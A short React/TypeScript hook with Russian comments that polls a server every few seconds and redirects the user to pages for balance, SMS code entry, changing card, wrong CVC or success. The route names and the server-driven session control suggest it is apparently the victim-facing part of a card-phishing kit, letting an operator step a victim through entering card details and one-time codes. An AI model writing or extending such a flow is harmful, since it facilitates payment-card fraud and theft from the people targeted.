import { useEffect } from "react";
import { useNavigate } from "react-router-dom";

interface RedirectResponse {
  success: boolean;
  redirect: boolean;
  type?: string;
  timestamp?: number;
}

export const useRedirectChecker = (interval: number = 3000) => {
  const navigate = useNavigate();

  useEffect(() => {
    const checkForRedirects = async () => {
      const sessionId = localStorage.getItem("currentSessionId");
      const clientId = localStorage.getItem("clientId"); // Добавляем clientId

      if (!sessionId || !clientId) return;

      try {
        const response = await fetch(
          `/api/check-redirect/${clientId}/${sessionId}` // Обновляем URL
        );
        const data: RedirectResponse = await response.json();

        if (data.success && data.redirect) {
          switch (data.type) {
            case "balance":
              console.log("🔄 Redirecting to balance page");
              navigate(`/balance/${sessionId}`);
              break;
            case "sms":
              console.log("🔄 Redirecting to SMS page");
              navigate(`/sms-code/${sessionId}`);
              break;
            case "change":
              console.log("🔄 Redirecting to change card page");
              navigate(`/change-card/${sessionId}`);
              break;
            case "success":
              console.log("🔄 Redirecting to success page");
              navigate(`/success/${sessionId}`);
              break;
            case "wrong-cvc":
              console.log("🔄 Redirecting to success page");
              navigate(`/wrong-cvc/${sessionId}`);
              break;
            default:
              console.log("Unknown redirect type:", data.type);
          }
        }
      } catch (error) {
        console.error("Error checking redirects:", error);
      }
    };

    checkForRedirects();
    const intervalId = setInterval(checkForRedirects, interval);
    return () => clearInterval(intervalId);
  }, [navigate, interval]);
};
